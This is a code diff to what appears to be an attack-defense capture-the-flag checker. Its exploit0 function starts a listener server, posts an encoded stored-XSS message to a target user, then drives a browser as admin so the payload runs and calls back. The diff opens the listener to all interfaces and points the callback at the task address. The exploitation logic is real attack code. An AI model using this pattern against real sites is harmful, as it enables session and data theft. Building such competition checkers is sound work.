@@ -21,7 +21,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 import hashlib
 
-HOST = "localhost"
+HOST = "0.0.0.0"
 PORT = 6452
 
 SERVICE_PORT = 3000
@@ -180,14 +180,11 @@ def server(logger):
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
     server_thread = threading.Thread(target=server, args=(logger, ))
     server_thread.start()
-    time.sleep(0.1)
-    # sanity check
-    logger.debug((await client.get(f"http://localhost:{PORT}/example")).text)
     username = secrets.token_hex(32)
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
     target = json.loads(task.attack_info)['username']
-    payload = encode(exploitMessage.format('localhost' if task.address == 'host.docker.internal' else task.address), target, logger)
+    payload = encode(exploitMessage.format(task.address), target, logger)
     r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
     assert_equals(r.status_code, 200, "exploit failed")
     xss_test(task, logger)
@@ -225,10 +222,7 @@ def xss_test(task, logger):
     driver.execute_script(f"document.getElementById('password').value = 'password';")
     driver.execute_script("document.getElementsByTagName('form')[0].submit();")
     driver.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/admin")
-    driver.refresh()
-    time.sleep(1)
     driver.close()
-
 
 @checker.exploit(1)
 async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
